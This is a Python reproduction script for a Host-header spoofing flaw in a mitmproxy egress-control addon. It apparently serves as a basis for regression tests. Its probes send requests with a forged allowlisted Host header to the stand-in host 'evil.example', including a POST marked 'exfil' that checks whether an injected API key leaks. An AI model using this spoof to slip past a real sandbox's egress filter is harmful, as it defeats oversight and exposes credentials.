#!/usr/bin/env python3
"""The proxy decides policy from a header the guest controls, then connects somewhere else.

`proxy_addon.request` takes its host from `flow.request.pretty_host`, which prefers the
client's `Host:` header. mitmproxy connects to `flow.request.host`, which for an absolute-form
request line comes from the URL. So a guest can name an allowlisted host in the header, have
the rule match, and have the request — plus any `inject_auth` credential — delivered to a host
of its choosing. The audit line records the forged name.

Turn these four cases into test/test_addon.py: the honest allow, the honest deny, the spoof
(must become a deny), and the spoof-with-injection (must never carry the secret).

    pip install mitmproxy && python3 test/repro/addon_host_spoof.py
"""
import os
import pathlib
import sys
import tempfile

SENTINEL = "x-api-key: SENTINEL-NOT-A-REAL-KEY"
REPO = pathlib.Path(__file__).resolve().parents[2]

rules = pathlib.Path(tempfile.mkdtemp()) / "rules.txt"
rules.write_text("api.anthropic.com/**  GET POST  q:*  h:*  max_body=10m  inject_auth=anthropic\n"
                 "registry.npmjs.org/** GET\n")
os.environ["SILKGATE_EGRESS_RULES"] = str(rules)
os.environ["SILKGATE_EGRESS_SECRET_ANTHROPIC"] = SENTINEL

sys.path.insert(0, str(REPO / "mitmaddon"))
import proxy_addon                                             # noqa: E402
from mitmproxy.test import tflow, tutils                       # noqa: E402


def probe(label, *, dest_host, dest_port, claimed_host, sni=None, method="GET", body=b""):
    headers = [(b"Host", claimed_host.encode())] if claimed_host else []
    headers.append((b"x-api-key", b"guest-dummy"))
    req = tutils.treq(host=dest_host, port=dest_port, method=method, path="/v1/messages",
                      headers=tuple(headers), content=body)
    flow = tflow.tflow(req=req)
    flow.client_conn.sockname = ("127.0.0.1", 8090)
    flow.client_conn.sni = sni                                 # None = plaintext to the proxy
    proxy_addon.request(flow)

    denied = flow.response is not None
    reason = flow.response.content.decode().strip() if denied else ""
    leaked = flow.request.headers.get("x-api-key") == SENTINEL.split(": ", 1)[1]
    print(f"{label}\n"
          f"    connects to      : {flow.request.host}:{flow.request.port}\n"
          f"    Host: header     : {claimed_host}\n"
          f"    verdict          : {'DENY (' + reason + ')' if denied else 'ALLOW'}\n"
          f"    secret injected  : {leaked}")
    return denied, leaked


print(__doc__.strip().splitlines()[0] + "\n")

probe("1. honest, allowlisted host — expect ALLOW",
      dest_host="api.anthropic.com", dest_port=443, claimed_host="api.anthropic.com")
probe("2. honest, unlisted host — expect DENY",
      dest_host="evil.example", dest_port=80, claimed_host="evil.example")
spoof_denied, _ = probe("3. unlisted host, allowlisted Host: header — SHOULD deny, does not",
                        dest_host="evil.example", dest_port=80,
                        claimed_host="registry.npmjs.org")
inject_denied, leaked = probe("4. same, against the credential-injecting rule — SHOULD deny",
                              dest_host="evil.example", dest_port=80, method="POST",
                              claimed_host="api.anthropic.com", body=b"exfil")
probe("5. as 4 but over TLS to the proxy, where SNI exists and is checked — expect DENY",
      dest_host="evil.example", dest_port=443, method="POST",
      claimed_host="api.anthropic.com", sni="evil.example", body=b"exfil")

print("\n--- what a fixed addon must satisfy ---")
print(f"  case 3 denied        : {spoof_denied}   (expected True)")
print(f"  case 4 denied        : {inject_denied}   (expected True)")
print(f"  case 4 leaked secret : {leaked}   (expected False)")
print("\nSuggested fix: match on normalize_host(req.host) and req.port, and additionally"
      "\nrequire that req.host_header, when present, normalizes to the same host — which"
      "\nsubsumes the SNI check and closes the plaintext path that has no SNI to compare.")
